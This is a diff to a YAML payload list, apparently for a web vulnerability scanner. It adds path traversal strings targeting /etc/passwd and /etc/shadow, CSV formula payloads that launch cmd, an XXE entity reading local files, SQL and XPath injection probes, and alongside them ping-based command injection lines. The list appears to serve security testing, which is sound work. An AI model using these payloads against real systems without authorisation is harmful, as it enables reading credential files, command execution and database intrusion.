@@ -10,22 +10,21 @@ F00000:
       - "^"
       - "&"
       - "*"
-      - "()"
+      - "("
       - "_"
       - "+"
       - "="
       - "|"
-      - "\"
+      - "\\"
       - "'"
       - ":"
       - ";"
       - "?"
-      - "/"
+      - "\/"
       - ">"
       - "."
       - "<"
       - "`"
-
 F00001:
   name: Command Injections
   description: 命令注入
@@ -36,3 +35,63 @@ F00001:
     - "| ping -n 30 127.0.0.1 |"
     - "& ping -i 30 127.0.0.1 &"
     - "& ping -n 30 127.0.0.1 &"
+F00002:
+  name: Path Traversal
+  description: 目录穿越
+  level: critical
+  payloads:
+    - "/etc/passwd"
+    - "/etc/passwd%00"
+    - "/etc/shadow"
+    - "/etc/shadow%00"
+    - "/etc/hosts"
+    - "/etc/hosts%00"
+    - "/boot.ini"
+    - "/boot.ini%00"
+    - "/../../../../../../../../../../../../../../../../../../etc/passwd"
+    - "%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+    - ".%252f/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+    
+F00003:
+  name:  CSV injection
+  description: CSV 注入
+  level: critical
+  payloads:
+    - "DDE (\"cmd\";\"/C calc\";\"!A0\")A0"
+    - "@SUM(1+1)*cmd|' /C calc'!A0"
+    - "=cmd|'/k ipconfig'!A0"
+    - ";=cmd|' /C calc'!A0 "
+    
+F00004:
+  name: XML injection
+  description: XML注入
+  level: critical
+  payloads:
+    - "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>"
+    - "<!ENTITY systemEntity SYSTEM \"robots.txt\">"
+    - "x' or name()='username' or 'x'='y"
+    - "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>"
+    
+F00005:
+  name: SQL Injection
+  description: SQL注入
+  level: critical
+  payloads:
+    - "OR 1=1"
+    - "OR 3409=3409 AND ('pytW' LIKE 'pytW"
+    - "ORDER BY 2-- "
+    - "%' AND 8310=8310 AND '%'='"
+    - "ORDER BY 9#"
+    - "or SLEEP(5)"
+    - "ORDER BY SLEEP(5)--"
+    - "UNION ALL SELECT 1 "
+
+F00006:
+  name: Xpath injection
+  description: Xpath注入
+  level: critical
+  payloads:
+    - "x' or name()='username' or 'x'='y"
+ 
+
+   
